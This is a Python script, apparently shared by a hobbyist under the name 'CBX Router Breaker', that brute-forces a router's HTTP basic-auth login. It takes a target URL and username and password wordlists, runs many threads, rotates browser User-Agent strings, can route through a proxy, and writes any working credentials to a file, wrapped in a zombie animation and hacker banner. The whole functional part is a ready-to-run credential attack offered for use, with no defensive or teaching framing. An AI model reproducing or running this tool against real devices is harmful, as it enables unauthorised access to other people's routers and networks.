import os
import time
import shutil
import requests
import threading
import random

# ==== Colors ====
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

PROXY = None
DELAY_BETWEEN_REQUESTS = 0.5
lock = threading.Lock()
found = False

# =================== Scary Zombie Animation Frames =======================
zombie_frames = [
r"""
       .-"      "-.
      /            \
     |              |
     |,  .-.  .-.  ,|
     | )(_o/  \o_)( |
     |/     /\     \|
     (_     ^^     _)
      \__|IIIIII|__/
       | \IIIIII/ |
       \          /
        `--------`
""",
r"""
       .-"      "-.
      /            \
     |    .-.  .-.  |
     |,  (_o/  \o_) ,|
     |/     /\     \|
     |     (  )     |
      \__|IIIIII|__/
       | \IIIIII/ |
       \          /
        `--------`
""",
r"""
       .-"      "-.
      /            \
     |  .-.    .-.  |
     | (_o/    \o_) |
     |/     /\     \|
     |     (  )     |
      \__|IIIIII|__/
       | \IIIIII/ |
       \          /
        `--------`
""",
r"""
       .-"      "-.
      /            \
     |              |
     |,  .-.  .-.  ,|
     | )(_o/  \o_)( |
     |/     /\     \|
     (_     ^^     _)
      \__|IIIIII|__/
       | \IIIIII/ |
       \          /
        `--------`
"""
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_terminal_width():
    size = shutil.get_terminal_size((80, 20))
    return size.columns

def zombie_walk(duration_seconds=4, delay=0.15):
    width = get_terminal_width()
    zombie_width = 24  # approx frame width
    
    end_time = time.time() + duration_seconds
    
    pos = 0
    direction = 1  # 1 = right, -1 = left
    
    while time.time() < end_time:
        clear_screen()
        frame = zombie_frames[pos % len(zombie_frames)]
        spaces = " " * pos
        print(spaces + frame)
        
        pos += direction
        if pos >= width - zombie_width:
            direction = -1
        elif pos <= 0:
            direction = 1
        
        time.sleep(delay)
    clear_screen()

# ==== User-Agent List ====
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
]

# ==== Brute Force Logic ====
def try_login(url, username, password):
    global found
    if found:
        return
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        response = requests.get(url, auth=(username, password), headers=headers, proxies=PROXY, timeout=10)
        if response.status_code == 200:
            with lock:
                if not found:
                    found = True
                    print(f"\n{GREEN}[✓] FOUND: {username}:{password} 🔥{RESET}")
                    with open("found_credentials.txt", "a") as f:
                        f.write(f"{username}:{password}\n")
        else:
            sample = response.text[:80].replace('\n', ' ').replace('\r', ' ')
            print(f"{CYAN}[*] {username}:{password} | Status: {response.status_code} | {sample}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[-] Error: {e}{RESET}")
    time.sleep(DELAY_BETWEEN_REQUESTS)

def load_list(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] File not found: {file_path}{RESET}")
        exit(1)

def main():
    clear_screen()
    zombie_walk()  # run scary zombie animation

    # Hacker style header
    print(f"""{RED}
╔══════════════════════════════════════════════╗
║   ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗   ║
║   ██║ ██╔╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝   ║
║   █████╔╝ ███████║██║     █████╔╝ █████╗     ║
║   ██╔═██╗ ██╔══██║██║     ██╔═██╗ ██╔══╝     ║
║   ██║  ██╗██║  ██║╚██████╗██║  ██╗███████╗   ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ║
║                                              ║
║     🧟‍♂️  CBX Router Breaker by Zombie Noyon  🧟‍♂️     ║
╚══════════════════════════════════════════════╝
{RESET}
{CYAN}▶ TikTok: {YELLOW}@cbx.noyon{RESET}
{CYAN}▶ Contact: {GREEN}https://cbxnoyon.carrd.co/{RESET}
""")

    target_ip = input(f"{YELLOW}[?] Target router URL (e.g. http://192.168.0.1/): {RESET}").strip()
    login_mode = input(f"{YELLOW}[?] Login Mode (1 = Password only, 2 = Username+Password): {RESET}").strip()

    if login_mode == "2":
        username_file = input(f"{YELLOW}[?] Username list file: {RESET}").strip()
        usernames = load_list(username_file)
    else:
        usernames = ["admin"]

    password_file = input(f"{YELLOW}[?] Password list file: {RESET}").strip()
    passwords = load_list(password_file)

    print(f"\n{GREEN}[✓] Loaded {len(usernames)} usernames and {len(passwords)} passwords. Starting...{RESET}\n")

    target_url = target_ip if target_ip.startswith("http") else f"http://{target_ip}"
    threads = []

    global found
    found = False

    # Animated loading bar
    print(f"{CYAN}Starting attack {RESET}", end='', flush=True)
    for i in range(20):
        print(f"{YELLOW}.", end='', flush=True)
        time.sleep(0.1)
    print("\n")

    for username in usernames:
        for password in passwords:
            if found:
                break
            t = threading.Thread(target=try_login, args=(target_url, username, password))
            threads.append(t)
            t.start()
            time.sleep(0.05)
        if found:
            break

    for t in threads:
        t.join()

    if not found:
        print(f"\n{RED}[X] No valid credentials found.{RESET}")
    print(f"{YELLOW}[•] Attack complete. CBX out!{RESET}")

if __name__ == "__main__":
    main()
